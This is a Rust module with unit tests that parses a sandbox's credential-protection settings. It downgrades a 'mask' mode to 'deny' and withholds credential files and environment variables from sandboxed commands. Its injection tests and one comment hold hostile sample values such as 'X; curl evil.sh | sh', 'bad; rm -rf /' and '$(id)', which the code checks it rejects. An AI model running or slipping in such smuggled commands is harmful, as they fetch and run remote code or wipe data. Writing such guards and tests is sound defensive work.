//! `sandbox.credentials` — the credential-protection settings block (HP-6).
//!
//! # What this port does, and what it deliberately does NOT
//!
//! Upstream protects a credential in one of two modes:
//!
//! * `deny` — the sandboxed process simply never sees it.
//! * `mask` — the process sees a SENTINEL, and the MITM proxy swaps the real
//!   value back in on egress (re-signing AWS SigV4 requests, re-minting JWTs,
//!   and honouring `extract` / `maskClaims` / `injectHosts` along the way).
//!
//! ⛔ This port implements `deny` and DEGRADES `mask` TO `deny`. The masking
//! pipeline — sentinel minting, proxy-side substitution, SigV4 re-signing — is
//! not built here (see the residual at the bottom of this file).
//!
//! 🚨 The degradation is the whole point of landing this now. Before it,
//! `sandbox.credentials` was an UNKNOWN settings key: parsed into nothing and
//! silently ignored, exactly like `allowPty`. A user who wrote
//! `{"mode": "mask"}` over their AWS keys got a sandbox that handed the real
//! keys to every command, while believing they were masked. Degrading to `deny`
//! fails in the recoverable direction — the tool that wanted the credential
//! stops working and says so — instead of the unrecoverable one.
//!
//! Every degraded entry is reported through [`CredentialResolution::degraded`]
//! so the composition root can say it out loud rather than let the user
//! discover it from a broken command.

use serde::{Deserialize, Deserializer, Serialize};

/// `mode` — `"deny"` or `"mask"`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CredentialMode {
    /// The sandboxed process never sees this credential.
    #[default]
    Deny,
    /// Upstream: the process sees a sentinel and the proxy substitutes the real
    /// value on egress. Here: degraded to [`Self::Deny`].
    Mask,
}

/// `mode`, read leniently: absent, null, or an unrecognized spelling all become
/// [`CredentialMode::Deny`].
///
/// 🚨 This is not tidiness, it is the difference between a typo costing the user
/// one credential rule and a typo costing them the whole sandbox. `mode` is the
/// only required field in this block, and the callers that parse a settings tier
/// (`apps/engine-desktop`'s `let Ok(parsed) = serde_json::from_str::<SettingsJson>(raw)
/// else { continue; }`) DISCARD A TIER THAT FAILS TO PARSE, with no log line. So a
/// missing `mode` — or `"Deny"` with the capital that JSON schema docs invite —
/// would take `sandbox.enabled`, `excludedCommands` and the network allowlist down
/// with it: a silent fail-OPEN caused by the very block that exists to protect a
/// credential. Defaulting to `Deny` keeps the tier and fails in the recoverable
/// direction, exactly like the `mask` degradation this module is built around.
/// (`deserialize_enabled_platforms` in `runtime_config` makes the same trade.)
fn deserialize_credential_mode<'de, D>(deserializer: D) -> Result<CredentialMode, D::Error>
where
    D: Deserializer<'de>,
{
    let raw: Option<serde_json::Value> = Option::deserialize(deserializer)?;
    Ok(raw
        .and_then(|value| serde_json::from_value::<CredentialMode>(value).ok())
        .unwrap_or(CredentialMode::Deny))
}

/// `onExtractNoMatch` — what to do when `extract` matches nothing.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum OnExtractNoMatch {
    /// Default: warn on stderr, the value passes through unmasked.
    Warn,
    /// Unset the variable inside the sandbox.
    Deny,
    /// Throw at wrap time.
    Error,
}

/// `decode` — an encoded-credential format the masker understands.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CredentialDecode {
    /// The value is verified to be a JWT and replaced with a structurally valid
    /// fake so client-side token parsing keeps working.
    Jwt,
}

/// A protected credential FILE or directory.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CredentialFile {
    /// Path to the file or directory.
    pub path: String,
    /// Access mode. Absent or unrecognized reads as `deny` — see
    /// [`deserialize_credential_mode`] for why this must never abort the tier.
    #[serde(default, deserialize_with = "deserialize_credential_mode")]
    pub mode: CredentialMode,
    /// Regex for structured masking; capture group 1 of each match is masked.
    /// Only meaningful with `mode: "mask"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extract: Option<String>,
    /// What to do when `extract` matches nothing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub on_extract_no_match: Option<OnExtractNoMatch>,
    /// Narrowing of where the proxy substitutes this credential. Defaults to
    /// `network.allowedDomains`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub inject_hosts: Option<Vec<String>>,
}

/// A protected environment variable.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CredentialEnvVar {
    /// Environment variable name.
    pub name: String,
    /// Access mode. Absent or unrecognized reads as `deny` — see
    /// [`deserialize_credential_mode`] for why this must never abort the tier.
    #[serde(default, deserialize_with = "deserialize_credential_mode")]
    pub mode: CredentialMode,
    /// Regex for structured masking; capture group 1 is masked.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extract: Option<String>,
    /// What to do when `extract` matches nothing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub on_extract_no_match: Option<OnExtractNoMatch>,
    /// Encoded-credential format.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub decode: Option<CredentialDecode>,
    /// Top-level payload claims to mask inside the decoded value instead of
    /// replacing the whole token. Requires `decode`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mask_claims: Option<Vec<String>>,
    /// Narrowing of where the proxy substitutes this credential.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub inject_hosts: Option<Vec<String>>,
}

/// `awsPairs` — an explicit grouping of masked env vars into an AWS credential
/// pair, for non-standard variable names.
///
/// The conventional `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` /
/// `AWS_SESSION_TOKEN` trio is paired automatically when masked.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AwsCredentialPair {
    /// Name of the masked env var holding the AWS access key id.
    pub access_key_id_var: String,
    /// Name of the masked env var holding the AWS secret access key.
    pub secret_access_key_var: String,
    /// Optional name of the masked env var holding the session token. When set,
    /// the proxy sends the real token as `x-amz-security-token` on re-signed
    /// requests.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_token_var: Option<String>,
}

/// `deny` (default) or `passthrough`, for a SigV4 shape the proxy cannot
/// re-sign.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Sigv4Policy {
    /// Refuse the request.
    Deny,
    /// Let it through unmodified — the sentinel reaches the upstream.
    Passthrough,
}

/// Policies for the SigV4 request shapes that cannot be re-signed.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Sigv4Policies {
    /// `aws-chunked` streaming uploads: per-chunk signatures chain off the seed
    /// signature, so re-signing would mean rewriting the body. Default `deny`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub streaming: Option<Sigv4Policy>,
    /// Presigned URLs: the signature lives in the URL. Default `deny`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub presigned: Option<Sigv4Policy>,
    /// SigV4A (`AWS4-ECDSA-P256-SHA256`): asymmetric, so there is no shared-key
    /// HMAC to recompute. Default `deny`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sigv4a: Option<Sigv4Policy>,
}

/// The `sandbox.credentials` block.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SandboxCredentials {
    /// Credential files or directories to protect.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub files: Option<Vec<CredentialFile>>,
    /// Environment variables to protect.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub env_vars: Option<Vec<CredentialEnvVar>>,
    /// Allow sentinel→real substitution on the PLAIN-HTTP proxy path.
    ///
    /// Defaults to false, and the reason is worth keeping: without TLS
    /// termination the upstream identity is unverified and the credential
    /// travels in cleartext. Upstream's own description says "set only for
    /// trusted-network test fixtures".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub allow_plaintext_inject: Option<bool>,
    /// Explicit AWS credential pairings for SigV4 re-signing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub aws_pairs: Option<Vec<AwsCredentialPair>>,
    /// Policies for un-re-signable SigV4 shapes.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sigv4: Option<Sigv4Policies>,
}

/// What a `sandbox.credentials` block reduces to in this port.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct CredentialResolution {
    /// Paths to add to `filesystem.deny_read`.
    pub deny_read_paths: Vec<String>,
    /// Environment variable names the sandboxed process must not receive.
    pub deny_env_vars: Vec<String>,
    /// Human-readable notices, one per entry whose `mask` was degraded to a
    /// deny. Empty when every entry asked for `deny` outright.
    pub degraded: Vec<String>,
}

/// Reduce a `sandbox.credentials` block to the protections this port can
/// actually enforce.
///
/// Both modes produce the same enforcement — the credential is withheld — and
/// they differ only in whether a notice is emitted. ⚠️ That equality is the
/// safety property: a `mask` entry must never fall through to "no protection"
/// just because the masking pipeline is missing.
#[must_use]
pub fn resolve(credentials: &SandboxCredentials) -> CredentialResolution {
    let mut out = CredentialResolution::default();

    for file in credentials.files.iter().flatten() {
        if file.path.trim().is_empty() {
            continue;
        }
        out.deny_read_paths.push(file.path.clone());
        if file.mode == CredentialMode::Mask {
            out.degraded.push(format!(
                "[sandbox] credential file '{}' is configured mask, which this build does not implement; reads are DENIED instead",
                file.path
            ));
        }
    }

    for var in credentials.env_vars.iter().flatten() {
        let Some(name) = accept_env_name(&var.name, &mut out.degraded) else {
            continue;
        };
        if !out.deny_env_vars.iter().any(|existing| existing == &name) {
            out.deny_env_vars.push(name.clone());
        }
        if var.mode == CredentialMode::Mask {
            out.degraded.push(format!(
                "[sandbox] credential env var '{name}' is configured mask, which this build does not implement; it is UNSET inside the sandbox instead"
            ));
        }
    }

    // `awsPairs` names variables that must already be masked. With masking
    // degraded to a deny, a pair whose variables were not themselves listed
    // would silently protect nothing — so the names are withheld too.
    for pair in credentials.aws_pairs.iter().flatten() {
        for name in [
            Some(&pair.access_key_id_var),
            Some(&pair.secret_access_key_var),
            pair.session_token_var.as_ref(),
        ]
        .into_iter()
        .flatten()
        {
            let Some(name) = accept_env_name(name, &mut out.degraded) else {
                continue;
            };
            if !out.deny_env_vars.iter().any(|existing| existing == &name) {
                out.deny_env_vars.push(name.clone());
                out.degraded.push(format!(
                    "[sandbox] AWS credential pair names '{name}', which is not in credentials.envVars; it is UNSET inside the sandbox"
                ));
            }
        }
    }

    out.deny_read_paths.dedup();
    out
}

/// Trim `raw` and accept it only if the enforcement point can actually withhold
/// it; otherwise record WHY in `degraded` and return `None`.
///
/// 🚨 This exists because the guard used to live only in [`unset_prefix`], which
/// drops a non-conforming name SILENTLY. `resolve()` would push
/// `"AWS_SECRET_ACCESS_KEY "` (a trailing space is invisible in JSON) or
/// `"MY-API-KEY"` into `deny_env_vars`, the composition root would report it as
/// protected — for `mask`, with a notice literally saying "it is UNSET inside the
/// sandbox instead" — and then the filter would discard it and the sandboxed
/// command would get the real value. That is the exact "reduces to no protection
/// without saying so" failure this whole module exists to prevent, so the
/// rejection has to happen where there is a channel to report it.
fn accept_env_name(raw: &str, degraded: &mut Vec<String>) -> Option<String> {
    let name = raw.trim();
    if name.is_empty() {
        return None;
    }
    if !is_posix_env_name(name) {
        degraded.push(format!(
            "[sandbox] credential env var '{name}' is not a POSIX environment-variable name ([A-Za-z_][A-Za-z0-9_]*), so this build CANNOT withhold it from the sandboxed command; rename the variable or remove the entry"
        ));
        return None;
    }
    Some(name.to_string())
}

/// Is `name` a POSIX environment-variable name?
///
/// 🚨 This is a SHELL-INJECTION guard, not tidiness. [`unset_prefix`] splices
/// these names into a shell command, and the names come from a settings file —
/// which on the project tier can be checked into a repository. A name like
/// `X; curl evil.sh | sh` must never reach the shell, so anything outside
/// `[A-Za-z_][A-Za-z0-9_]*` is dropped rather than quoted: there is no
/// legitimate credential variable that needs those characters.
#[must_use]
pub fn is_posix_env_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The shell prefix that drops `names` from the sandboxed command's
/// environment, or an empty string when there is nothing to drop.
///
/// Prefixing the command is what makes this portable: the wrap seam hands back
/// a shell command string on every platform, so one `unset` covers the Linux
/// bwrap path and the macOS seatbelt path without either needing to know about
/// credentials. `unset` is a builtin in every shell this runs under, and the
/// sandboxed command plus everything it spawns inherits the result.
#[must_use]
pub fn unset_prefix(names: &[String]) -> String {
    let safe = safe_names(names);
    if safe.is_empty() {
        return String::new();
    }
    format!("unset {}\n", safe.join(" "))
}

/// The same prefix, spelled for the shell that will actually run it.
///
/// 🚨 `unset` is a POSIX-shell builtin, and PowerShell does not have it — it
/// spells this `Remove-Item Env:NAME`. The wrap seam is shared: the PowerShell
/// tool folds only Windows out of `sandbox_available`
/// (`tools/shell/src/powershell.rs`), so on macOS and Linux it hands `pwsh` in as
/// `bin_shell` and the wrapped command is evaluated BY pwsh. A POSIX `unset`
/// there does not fail loudly enough to matter — it raises CommandNotFound and
/// the credential simply stays in the environment, which is the one outcome this
/// module must never produce quietly.
#[must_use]
pub fn unset_prefix_for_shell(names: &[String], bin_shell: Option<&str>) -> String {
    if !is_powershell(bin_shell) {
        return unset_prefix(names);
    }
    let safe = safe_names(names);
    if safe.is_empty() {
        return String::new();
    }
    // `-ErrorAction SilentlyContinue` so a variable that is simply absent does
    // not write an error record into the tool output the model reads.
    let statements: Vec<String> = safe
        .iter()
        .map(|name| format!("Remove-Item -Path Env:{name} -ErrorAction SilentlyContinue"))
        .collect();
    format!("{}\n", statements.join("; "))
}

/// The subset of `names` [`unset_prefix`] is willing to splice into a shell.
fn safe_names(names: &[String]) -> Vec<&str> {
    names
        .iter()
        .map(String::as_str)
        .filter(|name| is_posix_env_name(name))
        .collect()
}

/// Does `bin_shell` name a PowerShell binary? Matched on the file name so a full
/// path, a `.exe` suffix and a bare `pwsh` all resolve the same way.
fn is_powershell(bin_shell: Option<&str>) -> bool {
    let Some(shell) = bin_shell else { return false };
    let file = shell
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(shell)
        .to_ascii_lowercase();
    let stem = file.strip_suffix(".exe").unwrap_or(&file);
    stem == "pwsh" || stem == "powershell"
}

// ===== RESIDUAL: the masking pipeline ======================================
//
// Building real `mask` support means, at 2.1.270:
//
// * minting sentinels and substituting them into the sandboxed process's
//   environment and credential files;
// * swapping them back on egress inside the MITM proxy — this port already has
//   the proxy (`sandbox-runtime/{mitm_ca,mitm_leaf,tls_terminate,http_proxy}`),
//   which is the expensive half and is already built;
// * RE-SIGNING AWS SigV4: the request was signed with the SENTINEL secret, so
//   the canonical request and the HMAC-SHA256 chain have to be recomputed with
//   the real one. `awsPairs` exists to identify the key/secret/token trio when
//   the variable names are non-standard; the conventional
//   AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN trio pairs
//   automatically;
// * `sigv4.{streaming,presigned,sigv4a}` for the shapes that CANNOT be
//   re-signed, each defaulting to `deny`;
// * `extract` (capture group 1) + `onExtractNoMatch`, `decode:"jwt"` +
//   `maskClaims`, and `injectHosts`;
// * `allowPlaintextInject`, default false.
//
// ⚠️ And the deny/mask interaction: upstream resolves both against CANONICAL
// paths, so a mask can be shadowed by a deny that reaches the same file only
// through a symlink, and a trusted-tier deny is never retargeted by a
// lower-tier spelling. Getting that wrong re-points enforcement at the wrong
// file, which is the failure this whole block exists to prevent.

#[cfg(test)]
mod tests {
    use super::*;

    fn file(path: &str, mode: CredentialMode) -> CredentialFile {
        CredentialFile {
            path: path.into(),
            mode,
            extract: None,
            on_extract_no_match: None,
            inject_hosts: None,
        }
    }

    fn env(name: &str, mode: CredentialMode) -> CredentialEnvVar {
        CredentialEnvVar {
            name: name.into(),
            mode,
            extract: None,
            on_extract_no_match: None,
            decode: None,
            mask_claims: None,
            inject_hosts: None,
        }
    }

    /// 🚨 The safety property. `mask` and `deny` must produce the SAME
    /// enforcement here — if `mask` fell through to "no protection", a user who
    /// asked for their key to be masked would get a sandbox that hands out the
    /// real key, which is strictly worse than today's silent ignore because it
    /// now looks configured.
    #[test]
    fn mask_protects_exactly_as_much_as_deny() {
        let denied = resolve(&SandboxCredentials {
            files: Some(vec![file("/home/u/.aws/credentials", CredentialMode::Deny)]),
            env_vars: Some(vec![env("AWS_SECRET_ACCESS_KEY", CredentialMode::Deny)]),
            ..SandboxCredentials::default()
        });
        let masked = resolve(&SandboxCredentials {
            files: Some(vec![file("/home/u/.aws/credentials", CredentialMode::Mask)]),
            env_vars: Some(vec![env("AWS_SECRET_ACCESS_KEY", CredentialMode::Mask)]),
            ..SandboxCredentials::default()
        });
        assert_eq!(denied.deny_read_paths, masked.deny_read_paths);
        assert_eq!(denied.deny_env_vars, masked.deny_env_vars);
        // …and only the NOTICE differs.
        assert!(
            denied.degraded.is_empty(),
            "a plain deny is not a degradation"
        );
        assert_eq!(masked.degraded.len(), 2, "both mask entries are reported");
        assert!(masked.degraded[0].contains("/home/u/.aws/credentials"));
        assert!(masked.degraded[1].contains("AWS_SECRET_ACCESS_KEY"));
    }

    /// `awsPairs` names variables that upstream expects to be masked already.
    /// A pair naming a variable nobody listed would otherwise protect nothing.
    #[test]
    fn an_aws_pair_withholds_names_the_env_list_missed() {
        let resolved = resolve(&SandboxCredentials {
            env_vars: Some(vec![env("MY_KEY_ID", CredentialMode::Mask)]),
            aws_pairs: Some(vec![AwsCredentialPair {
                access_key_id_var: "MY_KEY_ID".into(),
                secret_access_key_var: "MY_SECRET".into(),
                session_token_var: Some("MY_TOKEN".into()),
            }]),
            ..SandboxCredentials::default()
        });
        assert_eq!(
            resolved.deny_env_vars,
            vec!["MY_KEY_ID", "MY_SECRET", "MY_TOKEN"],
            "the secret and token must be withheld even though only the key id \
             was listed"
        );
        assert!(
            resolved.degraded.iter().any(|d| d.contains("MY_SECRET")),
            "…and the user is told, because they did not ask for this one"
        );
        assert_eq!(
            resolved
                .deny_env_vars
                .iter()
                .filter(|name| *name == "MY_KEY_ID")
                .count(),
            1,
            "a name listed in both places is withheld once"
        );
    }

    /// The camelCase wire shape, end to end — a settings block that does not
    /// deserialize protects nothing at all.
    #[test]
    fn the_wire_shape_matches_the_settings_json_a_user_writes() {
        let parsed: SandboxCredentials = serde_json::from_str(
            r#"{
                "files": [{"path": "~/.aws/credentials", "mode": "mask",
                           "extract": "aws_secret_access_key\\s*=\\s*(\\S+)",
                           "onExtractNoMatch": "deny"}],
                "envVars": [{"name": "GH_TOKEN", "mode": "mask",
                             "decode": "jwt", "maskClaims": ["sub"],
                             "injectHosts": ["api.github.com"]}],
                "allowPlaintextInject": false,
                "awsPairs": [{"accessKeyIdVar": "A", "secretAccessKeyVar": "B",
                              "sessionTokenVar": "C"}],
                "sigv4": {"streaming": "deny", "presigned": "passthrough"}
            }"#,
        )
        .expect("the documented settings shape must parse");

        let files = parsed.files.as_ref().unwrap();
        assert_eq!(files[0].mode, CredentialMode::Mask);
        assert_eq!(files[0].on_extract_no_match, Some(OnExtractNoMatch::Deny));
        let vars = parsed.env_vars.as_ref().unwrap();
        assert_eq!(vars[0].decode, Some(CredentialDecode::Jwt));
        assert_eq!(
            vars[0].mask_claims.as_deref(),
            Some(&["sub".to_string()][..])
        );
        assert_eq!(parsed.allow_plaintext_inject, Some(false));
        assert_eq!(
            parsed.aws_pairs.as_ref().unwrap()[0]
                .session_token_var
                .as_deref(),
            Some("C")
        );
        let sigv4 = parsed.sigv4.as_ref().unwrap();
        assert_eq!(sigv4.streaming, Some(Sigv4Policy::Deny));
        assert_eq!(sigv4.presigned, Some(Sigv4Policy::Passthrough));
        assert_eq!(sigv4a_default(sigv4), Sigv4Policy::Deny);
    }

    /// An unset SigV4 policy defaults to `deny` — the safe side, because the
    /// alternative sends a sentinel upstream.
    fn sigv4a_default(policies: &Sigv4Policies) -> Sigv4Policy {
        policies.sigv4a.unwrap_or(Sigv4Policy::Deny)
    }

    /// 🚨 The injection guard. A project-tier settings file is checked into a
    /// repository, so a credential variable NAME is attacker-influenceable on a
    /// repo you did not write.
    #[test]
    fn a_name_that_is_not_a_posix_env_name_never_reaches_the_shell() {
        for hostile in [
            "X; curl evil.sh | sh",
            "X`id`",
            "X$(id)",
            "X Y",
            "-rf",
            "1STARTS_WITH_DIGIT",
            "",
            "X\nY",
            "X'",
        ] {
            assert!(
                !is_posix_env_name(hostile),
                "{hostile:?} must not be treated as an env name"
            );
            assert_eq!(
                unset_prefix(&[hostile.to_string()]),
                "",
                "{hostile:?} must not reach the shell at all"
            );
        }
        for ok in ["AWS_SECRET_ACCESS_KEY", "_private", "A1", "_"] {
            assert!(is_posix_env_name(ok), "{ok:?} is a valid env name");
        }
    }

    #[test]
    fn the_unset_prefix_drops_every_valid_name_and_nothing_else() {
        assert_eq!(unset_prefix(&[]), "");
        assert_eq!(
            unset_prefix(&["AWS_SECRET_ACCESS_KEY".into(), "GH_TOKEN".into()]),
            "unset AWS_SECRET_ACCESS_KEY GH_TOKEN\n"
        );
        // A hostile name is dropped WITHOUT dropping its valid neighbours —
        // silently skipping the whole list would leave the good ones exposed.
        assert_eq!(
            unset_prefix(&["GOOD".into(), "bad; rm -rf /".into(), "ALSO_GOOD".into()]),
            "unset GOOD ALSO_GOOD\n"
        );
    }

    #[test]
    fn an_absent_block_protects_nothing_and_says_nothing() {
        let resolved = resolve(&SandboxCredentials::default());
        assert!(resolved.deny_read_paths.is_empty());
        assert!(resolved.deny_env_vars.is_empty());
        assert!(resolved.degraded.is_empty());
    }

    /// 🚨 The tier-survival property. `mode` is the only required field in this
    /// block, and a tier that fails to deserialize is DISCARDED by every caller
    /// without a log line — taking `sandbox.enabled` and the network allowlist
    /// with it. So a missing or misspelled `mode` must cost the user that one
    /// rule's precision, never their whole sandbox.
    #[test]
    fn a_missing_or_misspelled_mode_still_parses_and_reads_as_deny() {
        for raw in [
            r#"{"envVars": [{"name": "AWS_SECRET_ACCESS_KEY"}]}"#,
            r#"{"envVars": [{"name": "AWS_SECRET_ACCESS_KEY", "mode": "Deny"}]}"#,
            r#"{"envVars": [{"name": "AWS_SECRET_ACCESS_KEY", "mode": null}]}"#,
            r#"{"envVars": [{"name": "AWS_SECRET_ACCESS_KEY", "mode": 7}]}"#,
        ] {
            let parsed: SandboxCredentials = serde_json::from_str(raw)
                .unwrap_or_else(|e| panic!("{raw} must not abort the tier: {e}"));
            assert_eq!(
                parsed.env_vars.as_ref().unwrap()[0].mode,
                CredentialMode::Deny
            );
            assert_eq!(
                resolve(&parsed).deny_env_vars,
                vec!["AWS_SECRET_ACCESS_KEY"],
                "…and the protection the user asked for is still enforced"
            );
        }
        // The same for a file entry, whose `mode` is equally required.
        let parsed: SandboxCredentials =
            serde_json::from_str(r#"{"files": [{"path": "~/.aws/credentials"}]}"#)
                .expect("a file entry without `mode` must not abort the tier");
        assert_eq!(parsed.files.as_ref().unwrap()[0].mode, CredentialMode::Deny);
    }

    /// 🚨 A name the enforcement point cannot use must be REPORTED, not dropped.
    /// Silently dropping it is how `mask` fell through to "no protection" while
    /// the notice claimed the variable had been unset.
    #[test]
    fn a_name_the_wrap_seam_cannot_unset_is_reported_not_silently_dropped() {
        for hostile in ["MY-API-KEY", "1BAD", "HAS SPACE"] {
            let resolved = resolve(&SandboxCredentials {
                env_vars: Some(vec![env(hostile, CredentialMode::Mask)]),
                ..SandboxCredentials::default()
            });
            assert!(
                resolved.deny_env_vars.is_empty(),
                "{hostile:?} must not be reported as withheld when it cannot be"
            );
            assert_eq!(
                resolved.degraded.len(),
                1,
                "…and the user must be told once"
            );
            assert!(
                resolved.degraded[0].contains(hostile) && resolved.degraded[0].contains("CANNOT"),
                "the notice must name the variable and say it is not enforced: {:?}",
                resolved.degraded
            );
            assert!(
                !resolved.degraded[0].contains("is UNSET inside the sandbox"),
                "…and must NOT be the mask notice, which would be a lie: {:?}",
                resolved.degraded
            );
        }
    }

    /// A trailing space is invisible in a JSON settings file, so it must not be
    /// the difference between a protected credential and an unprotected one.
    #[test]
    fn a_padded_name_is_trimmed_rather_than_becoming_unenforceable() {
        let resolved = resolve(&SandboxCredentials {
            env_vars: Some(vec![env("  AWS_SECRET_ACCESS_KEY  ", CredentialMode::Deny)]),
            ..SandboxCredentials::default()
        });
        assert_eq!(resolved.deny_env_vars, vec!["AWS_SECRET_ACCESS_KEY"]);
        assert_eq!(
            unset_prefix(&resolved.deny_env_vars),
            "unset AWS_SECRET_ACCESS_KEY\n",
            "…and it actually reaches the command"
        );
    }

    /// 🚨 The wrap seam is shared with the PowerShell tool, which folds only
    /// WINDOWS out of `sandbox_available` — so on macOS/Linux `pwsh` evaluates
    /// this prefix. `unset` is not a PowerShell command; emitting it there leaves
    /// the credential in place, which is the failure this module forbids.
    #[test]
    fn the_prefix_is_spelled_for_the_shell_that_runs_it() {
        let names = vec!["AWS_SECRET_ACCESS_KEY".to_string(), "GH_TOKEN".to_string()];
        assert_eq!(
            unset_prefix_for_shell(&names, Some("/bin/bash")),
            "unset AWS_SECRET_ACCESS_KEY GH_TOKEN\n"
        );
        assert_eq!(unset_prefix_for_shell(&names, None), unset_prefix(&names));
        for pwsh in [
            "pwsh",
            "/opt/homebrew/bin/pwsh",
            "C:\\Program Files\\PowerShell\\pwsh.exe",
        ] {
            assert_eq!(
                unset_prefix_for_shell(&names, Some(pwsh)),
                "Remove-Item -Path Env:AWS_SECRET_ACCESS_KEY -ErrorAction SilentlyContinue; \
                 Remove-Item -Path Env:GH_TOKEN -ErrorAction SilentlyContinue\n",
                "{pwsh} must get the PowerShell spelling"
            );
        }
        // An empty list stays empty in both dialects — no stray statement.
        assert_eq!(unset_prefix_for_shell(&[], Some("pwsh")), "");
        assert_eq!(
            unset_prefix_for_shell(&["bad; rm -rf /".into()], Some("pwsh")),
            "",
            "the injection guard applies in both dialects"
        );
    }

    #[test]
    fn a_blank_path_or_name_is_skipped_rather_than_denying_everything() {
        let resolved = resolve(&SandboxCredentials {
            files: Some(vec![file("   ", CredentialMode::Deny)]),
            env_vars: Some(vec![env("", CredentialMode::Mask)]),
            ..SandboxCredentials::default()
        });
        assert!(
            resolved.deny_read_paths.is_empty() && resolved.deny_env_vars.is_empty(),
            "an empty path must not become a deny rule that matches everything"
        );
    }
}
